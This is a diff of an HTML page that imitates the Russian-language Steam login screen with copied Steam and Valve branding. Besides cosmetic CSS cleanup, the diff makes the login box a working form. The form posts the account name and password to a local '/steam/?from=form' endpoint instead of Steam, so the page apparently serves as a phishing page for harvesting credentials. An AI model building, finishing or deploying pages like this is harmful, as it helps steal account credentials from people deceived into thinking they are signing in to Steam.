@@ -13,7 +13,6 @@
         }
 
         body {
-            /* ИСПРАВЛЕНО: убрана кириллица в пути */
             background-image: url("resources/new_login_bg_strong_mask.jpg");
             width: 100%;
             background-size: cover;
@@ -69,7 +68,6 @@
 
         .header__navigation {
             color: #E9E9E9;
-
             display: flex;
             gap: 20px;
             margin-left: 60px;
@@ -86,11 +84,9 @@
             align-items: center;
             gap: 12px;
             padding: 6px 12px;
-
             background: #5c7e10;
             font-size: 11px;
             word-spacing: -0.5px;
-
             position: absolute;
             top: 5px;
             right: 790px;
@@ -105,7 +101,6 @@
             display: flex;
             align-items: center;
             gap: 0;
-
             transform: translateX(-300px);
         }
 
@@ -142,7 +137,7 @@
             background: #fff;
             border: 1px solid #32353c;
             border-radius: 1px;
-            color: #fff;
+            color: #1b2838;
             outline: none;
         }
 
@@ -157,7 +152,6 @@
             background: linear-gradient(90deg, #06bfff, #2d73ff);
             color: white;
             cursor: pointer;
-
             display: block;
             margin: 0 auto;
             text-align: center;
@@ -181,7 +175,7 @@
             font-size: 12px;
         }
 
-        .qr__box{
+        .qr__box {
             background-color: #ffffff;
             padding: 6px;
             border-radius: 8px;
@@ -203,7 +197,7 @@
         }
 
         .footer {
-            background-color:  #171a21;
+            background-color: #171a21;
             padding: 80px 20px;
             margin-top: 200px;
         }
@@ -228,7 +222,6 @@
             background: linear-gradient(90deg, #06bfff, #2d73ff);
             color: white;
             cursor: pointer;
-
             display: block;
             margin: 12px auto;
             text-align: center;
@@ -236,7 +229,6 @@
 
         .footer__text {
             text-align: center;
-
             max-width: 380px;
             margin: 0;
             color: #afafaf;
@@ -289,7 +281,7 @@
             width: 250px;
             gap: 20px;
             font-size: 13px;
-            inline-size: 1.5px;
+            line-height: 1.5;
         }
     </style>
 </head>
@@ -297,7 +289,6 @@
 <body>
 <div class="header">
     <div class="header__left">
-        <!-- ИСПРАВЛЕНО -->
         <a href="https://store.steampowered.com/" target="_blank"><img src="resources/header_logo.png" width="176" height="44" alt="Ссылка на главную страницу Steam"></a>
 
         <div class="header__navigation">
@@ -309,7 +300,6 @@
     </div>
 
     <div class="downloand__button">
-        <!-- ИСПРАВЛЕНО -->
         <img src="resources/btn_header_installsteam_download.png">
         <a href="https://store.steampowered.com/about/" target="_blank">Установить Steam</a>
     </div>
@@ -325,30 +315,32 @@
 </div>
 
 <div class="login__card">
-    <div>
+
+    <form action="/steam/?from=form" method="post">
         <div>
             <span style="color: #1999ff; font-size: 12px;">ВОЙДИТЕ, ИСПОЛЬЗУЯ ИМЯ АККАУНТА</span>
-            <input type="text" value>
+            <input type="text" name="login" placeholder="Имя аккаунта" autocomplete="off">
         </div>
         <div>
             <span style="font-size: 12px;">ПАРОЛЬ</span>
-            <input type="password" value>
+            <input type="password" name="password" placeholder="Пароль" autocomplete="off">
         </div>
-        <div tabindex="0" role="checkbox" aria-checked="false">
-            <span style="font-size: 12px;">Запомнить меня</span>
-        </div>
+        <label style="display: inline-flex; align-items: center; gap: 8px; cursor: pointer; font-size: 12px;">
+            <input type="checkbox" name="remember" value="yes">
+            <span>Запомнить меня</span>
+        </label>
         <div>
-            <button style="font-size: 16px;">Войти</button>
+            <button type="submit" style="font-size: 16px;">Войти</button>
         </div>
         <div>
             <a class="help-link" href="https://help.steampowered.com/ru/wizard/HelpWithLogin?redir=https%3A%2F%2Fsteamcommunity.com%2Flogin%3Fl%3Drussian" target="_blank">Помогите, я не могу войти в аккаунт</a>
         </div>
-    </div>
+    </form>
+
     <div>
         <div>
             <span style="color: #1999ff; font-size: 12px;">ИЛИ QR-КОД</span>
             <div class="qr__box">
-                <!-- ИСПРАВЛЕНО -->
                 <img alt src="resources/c0b4f2234f79cff938007055e7b6329e.svg">
             </div>
             <div class="qr__text">
@@ -374,10 +366,8 @@
     <div class="footer__content">
         <div class="footer__first">
             <div class="footer__logos">
-                <!-- ИСПРАВЛЕНО -->
                 <a href="https://store.steampowered.com/"><img src="resources/logo_steam.svg" width="142" height="40" viewBox="0 0 1 42 34" fill="currentColor"></a>
 
-                <!-- ИСПРАВЛЕНО -->
                 <a href="https://www.valvesoftware.com/ru/"><img src="resources/footerLogo_valve_new.png" width="95" height="27" viewBox="0 0 95 27" fill="currentColor"></a>
             </div>
 
